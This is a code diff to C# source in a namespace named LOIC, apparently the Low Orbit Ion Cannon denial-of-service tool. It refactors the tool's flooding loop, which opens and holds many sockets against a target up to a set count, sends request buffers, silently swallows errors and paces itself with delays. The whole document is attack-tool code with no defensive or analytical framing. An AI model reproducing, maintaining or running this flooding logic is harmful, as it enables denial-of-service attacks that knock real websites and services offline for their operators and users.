@@ -195,10 +195,7 @@ namespace LOIC
                             }
                             socket.Send(sbuf);
                         }
-                        catch
-                        {
-                            ;
-                        }
+                        catch { }
 
                         if (socket.Connected)
                         {
@@ -269,15 +266,14 @@ namespace LOIC
                                 _lSockets.Insert(0, socket);
                                 Requested++;
                             }
-
-                            if ((_lSockets.Count < _nSockets) && (Delay > 0))
-                            {
-                                System.Threading.Thread.Sleep(Delay);
-                            }
                         }
                         if (_lSockets.Count >= _nSockets)
                         {
                             IsDelayed = false;
+                        }
+                        else if (Delay > 0)
+                        {
+                            System.Threading.Thread.Sleep(Delay);
                         }
                     }
 
@@ -442,12 +438,12 @@ namespace LOIC
                         {
                             _lSockets.Add(socket);
                             Requested++;
-                            if ((_lSockets.Count < _nSockets) && (Delay > 0))
-                            {
-                                System.Threading.Thread.Sleep(Delay);
-                            }
                         }
                         IsDelayed = (_lSockets.Count < _nSockets);
+                        if (IsDelayed && (Delay > 0))
+                        {
+                            System.Threading.Thread.Sleep(Delay);
+                        }
                     }
                     State = ReqState.Requesting;
                     if (_randcmds)
@@ -477,10 +473,10 @@ namespace LOIC
                         }
                     }
 
+                    State = ReqState.Completed;
                     IsDelayed = (_lSockets.Count < _nSockets);
                     if (!IsDelayed)
                     {
-                        State = ReqState.Completed;
                         System.Threading.Thread.Sleep(Timeout);
                     }
                 }
